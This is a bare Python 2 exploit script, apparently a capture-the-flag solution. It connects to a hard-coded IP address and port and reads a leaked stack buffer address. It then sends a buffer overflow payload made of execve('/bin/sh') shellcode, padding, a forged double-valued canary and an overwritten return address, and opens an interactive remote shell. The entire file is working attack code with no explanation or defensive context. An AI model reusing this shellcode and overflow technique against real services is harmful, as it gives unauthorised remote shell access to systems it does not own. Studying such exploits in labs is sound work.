import socket
import struct
import telnetlib

ip = "54.173.98.115"
port = 1259




shell =  "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f"
shell += "\x73\x68\x68\x2f\x62\x69\x6e\x89"
shell += "\xe3\xb0\x30\x2c\x25\xcd\x80"

s = socket.create_connection((ip, port))

def read_until(c):
	temp = ""
	while not c in temp:
		temp += s.recv(1)
	return temp

def read(n):
    return s.recv(n)

read_until("Buff: 0x")
addy = int(read(8), 16)
print "addy: " + hex(addy)

payload = shell
payload += (0x98-0x18 - len(shell)) * "a"
payload += struct.pack("d", 64.33333)
payload += (0x94 - len(payload)) * "a"
payload += struct.pack("I", addy)

print payload

s.send(payload)

t = telnetlib.Telnet()                                                  
t.sock = s                                                              
t.interact() 



